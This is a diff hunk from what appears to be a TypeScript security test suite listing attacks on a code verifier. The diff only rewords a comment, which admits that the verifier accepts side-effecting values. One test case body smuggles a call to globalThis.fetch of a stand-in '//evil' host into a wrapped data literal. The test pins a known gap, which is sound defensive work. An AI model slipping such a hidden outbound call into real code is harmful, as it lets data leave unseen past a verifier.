@@ -118,9 +118,8 @@ const ATTACKS: Attack[] = [
     // side-effecting computed value inside the wrapped literal is accepted by
     // the (deliberately AST-free) verifier; the runtime data-freeze is the
     // backstop for the value itself. This is NOT reachable from authored TS via
-    // the trusted transformer (it only wraps statically-classified data), and
-    // tightening it to a purity check is tracked as separate hardening work.
-    // The test pins the current behavior so a future change is a conscious one.
+    // the trusted transformer (it only wraps statically-classified data). The
+    // test pins the current behavior so a future change is a conscious one.
     name: "__cf_data argument is opaque (side-effecting value accepted)",
     body:
       `${IMPORT}\nexports.x = cf.__cf_data({ y: (globalThis.fetch("//evil"), 1) });`,
